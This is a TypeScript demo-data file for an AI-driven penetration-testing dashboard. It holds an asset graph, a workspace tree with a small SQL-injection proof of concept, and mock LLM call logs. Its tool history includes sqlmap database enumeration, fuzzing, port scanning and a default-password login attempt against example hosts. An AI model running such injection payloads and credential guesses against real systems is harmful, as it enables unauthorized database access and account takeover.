    { key: "a:9", kind: "service", label: "admin.acme.com", tested: false, in_scope: true, asset_id: 9, domain: "admin.acme.com", url: "https://admin.acme.com", port: 443, page_title: "后台登录", status_code: 200 },
    { key: "a:10", kind: "ip", label: "203.0.113.10", tested: true, in_scope: true, asset_id: 10, ip: "203.0.113.10", company_id: 1 },
  ],
  edges: [
    { src: "a:1", dst: "c:1" },
    { src: "a:2", dst: "a:1" },
    { src: "a:3", dst: "a:1" },
    { src: "a:4", dst: "a:1" },
    { src: "a:5", dst: "a:2" },
    { src: "a:6", dst: "a:5" },
    { src: "a:7", dst: "a:3" },
    { src: "a:8", dst: "a:7" },
    { src: "a:9", dst: "a:4" },
    { src: "a:10", dst: "c:1" },
  ],
};

// ── 资产在本任务关联的意图/事实/发现（/tasks/{id}/asset-refs）──
export function assetRefsFor(_assetId: number) {
  return {
    intents: [
      { id: 12, kind: "intent", state: "done", summary: "对 www.acme.com 搜索接口做 SQL 注入探测" },
      { id: 18, kind: "intent", state: "running", summary: "枚举 api.acme.com 的对象越权 (IDOR)" },
    ],
    facts: [
      { id: 34, kind: "fact", state: "confirmed", summary: "search?q= 参数可注入，报错回显 MySQL 语法错误" },
    ],
    findings: [
      { id: 41, kind: "finding", state: "confirmed", summary: "[高] SQL 注入 www.acme.com/search?q=" },
    ],
  };
}

// ── 工作空间文件管理器（/workspace/*，demo：静态示例树）──
const WS_TREE: Record<string, { name: string; dir: boolean; size: number; content?: string }[]> = {
  "": [
    { name: "t-001", dir: true, size: 0 },
    { name: "transcripts", dir: true, size: 0 },
    { name: "notes.md", dir: false, size: 96, content: "# 工作区笔记\n\n（demo）这是工作空间根目录下的示例文件，可在线编辑并保存。\n" },
  ],
  "t-001": [
    { name: "i12", dir: true, size: 0 },
    { name: "recon.txt", dir: false, size: 64, content: "acme.com\nwww.acme.com\napi.acme.com\nadmin.acme.com\n" },
  ],
  "t-001/i12": [
    { name: "exploit.py", dir: false, size: 220, content: "#!/usr/bin/env python3\n# (demo) SQLi PoC — www.acme.com/search?q=\nimport requests\n\nr = requests.get('https://www.acme.com/search', params={'q': \"1' OR '1'='1\"})\nprint(r.status_code, len(r.text))\n" },
    { name: "response.html", dir: false, size: 180, content: "<!-- (demo) 抓到的响应体片段 -->\n<html><body>MySQL error near ''1'='1'</body></html>\n" },
  ],
  transcripts: [
    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, content: "（demo）原始 LLM 对话记录示例，此处省略。" },
  ],
};

const wsClean = (p: string) => p.replace(/^\/+|\/+$/g, "");

export function workspaceList(path: string) {
  const key = wsClean(path);
  const items = WS_TREE[key] ?? [];
  const now = Date.parse("2026-08-09T03:00:00Z");
  return {
    path: key,
    entries: items.map((it, i) => ({
      name: it.name,
      path: key ? `${key}/${it.name}` : it.name,
      dir: it.dir,
      size: it.size,
      mtime: now - i * 3_600_000,
    })),
  };
}

export function workspaceRead(path: string) {
  const key = wsClean(path);
  const slash = key.lastIndexOf("/");
  const parent = slash >= 0 ? key.slice(0, slash) : "";
  const name = slash >= 0 ? key.slice(slash + 1) : key;
  const f = (WS_TREE[parent] ?? []).find((x) => x.name === name && !x.dir);
  return { path: key, size: f?.size ?? 0, binary: false, content: f?.content ?? "" };
}

// ── 工具执行历史（/commands）──
export const commandRecords = [
  { id: 1, exploration_id: 1, worker: "worker-1", tool: "bash", command: JSON.stringify({ command: "curl -s 'https://www.acme.com/search?q=test'" }), output: "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… 搜索结果页 …</html>", is_error: false, created_at: T("2026-08-09T02:10:00Z") },
  { id: 2, exploration_id: 1, worker: "worker-1", tool: "bash", command: JSON.stringify({ command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs" }), output: "[*] available databases [2]:\n[*] acme_prod\n[*] information_schema\nback-end DBMS: MySQL >= 5.7", is_error: false, created_at: T("2026-08-09T02:12:30Z") },
  { id: 3, exploration_id: 1, worker: "worker-2", tool: "bash", command: JSON.stringify({ command: "ffuf -u https://api.acme.com/FUZZ -w common.txt -mc 200,401,403" }), output: "v1       [Status: 200]\nhealth   [Status: 200]\norders   [Status: 401]\nadmin    [Status: 403]", is_error: false, created_at: T("2026-08-09T02:15:00Z") },
  { id: 4, exploration_id: 1, worker: "worker-2", tool: "bash", command: JSON.stringify({ command: "nmap -sV -p- 203.0.113.10" }), output: "PORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9\n443/tcp open  https   nginx 1.24", is_error: false, created_at: T("2026-08-09T02:18:00Z") },
  { id: 5, exploration_id: 1, worker: "worker-1", tool: "bash", command: JSON.stringify({ command: "curl -s https://admin.acme.com/login --data 'user=admin&pass=admin123'" }), output: "curl: (28) Operation timed out after 10000 ms", is_error: true, created_at: T("2026-08-09T02:20:00Z") },
];

// ── LLM 录制（/llm/records、/llm/records/{id}）──
export const llmRecords = [
  { id: 1, ts: T("2026-08-09T02:10:02Z"), model: "claude-opus-4-8", profile_name: "默认", session_id: "exp1-worker-i12", task_id: "t-001", worker: "worker-1", latency_ms: 3210, input_tokens: 8421, output_tokens: 512, cache_read: 6000, cache_write: 1200, status: "ok" },
  { id: 2, ts: T("2026-08-09T02:11:40Z"), model: "claude-opus-4-8", profile_name: "默认", session_id: "exp1-planner", task_id: "t-001", worker: "planner", latency_ms: 4180, input_tokens: 12044, output_tokens: 733, cache_read: 9000, cache_write: 1500, status: "ok" },
  { id: 3, ts: T("2026-08-09T02:15:20Z"), model: "claude-opus-4-8", profile_name: "默认", session_id: "exp1-worker-i18", task_id: "t-001", worker: "worker-2", latency_ms: 2890, input_tokens: 7311, output_tokens: 421, cache_read: 5200, cache_write: 900, status: "ok" },
  { id: 4, ts: T("2026-08-09T02:16:05Z"), model: "claude-opus-4-8", profile_name: "默认", session_id: "exp1-worker-i18", task_id: "t-001", worker: "worker-2", latency_ms: 900, input_tokens: 7600, output_tokens: 0, cache_read: 5200, cache_write: 0, status: "error", error: "429 Too Many Requests（已退避重试）" },
];

// Distinct tasks with counts, derived from llmRecords above (task picker).
const llmTaskCounts: Record<string, number> = {};
for (const r of llmRecords) if (r.task_id) llmTaskCounts[r.task_id] = (llmTaskCounts[r.task_id] ?? 0) + 1;
export const llmTasks: LLMTask[] = Object.entries(llmTaskCounts).map(([task_id, count]) => ({ task_id, count }));

export function llmRecordDetail(id: number, records = llmRecords) {
  const item = records.find((r) => r.id === id) ?? records[0];
  return {
    ...item,
    request_body: JSON.stringify(
      {
        model: item.model,
        system: "你是一个授权渗透测试系统的「执行者」…（省略）",
        messages: [
          { role: "user", content: "开始执行 system 提示里的这条意图：只做它、只产生事实、做完即停。" },
        ],
        tools: ["bash", "insert_assets", "record_fact", "report_finding"],
      },
      null,
      2,
    ),
    response_body: JSON.stringify(
      {
        stop_reason: item.status === "error" ? "error" : "tool_use",
        content: [
          { type: "text", text: "对 search?q= 做注入探测，先用报错型 payload 验证。" },
          { type: "tool_use", name: "bash", input: { command: "curl -s 'https://www.acme.com/search?q=1%27'" } },
        ],
        usage: { input_tokens: item.input_tokens, output_tokens: item.output_tokens },
      },
      null,
      2,
    ),
  };
}
